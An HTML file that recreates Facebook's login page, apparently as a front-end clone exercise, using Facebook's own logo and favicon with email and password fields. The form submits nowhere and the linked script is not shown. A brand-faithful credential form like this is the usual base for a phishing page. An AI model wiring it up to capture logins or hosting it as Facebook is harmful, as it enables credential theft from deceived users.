<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook login page</title>
    <link rel="stylesheet" href="style.css">
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yb/r/hLRJ1GG_y0J.ico">
</head>
<body>
    <div class="container">
        <div class="flex">
            <div class="fb-logo">
                <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook">
                <p id="p1">Facebook helps you connect and share </p>
                <p id="p1">with the people in your life.</p>
            </div>
            <div class="form">
                <div class="before">
                    <form>
                        <form action="">
                        <input type="email" placeholder="Email address or phone number" id="input1" required><br>    
                        <input type="password" placeholder="Password" id="input2" required><br>
                        <button class="b1" id="button">Log in</button></form><br><br>
			        </form>
			        <form>
                        <a href="#" class="link">Forgotten password?</a><br><br><hr><br>
                        <button class="b2">Create new account</button>
                    </form>
                </div>
            </div>
            <div class="txt">
                <p id="pt"><a href="#" id="alink">Create a page </a>for a celebrity, brand or business</p>
            </div>
        </div>
    </div>
    <script src="script.js"></script>
</body>
</html>
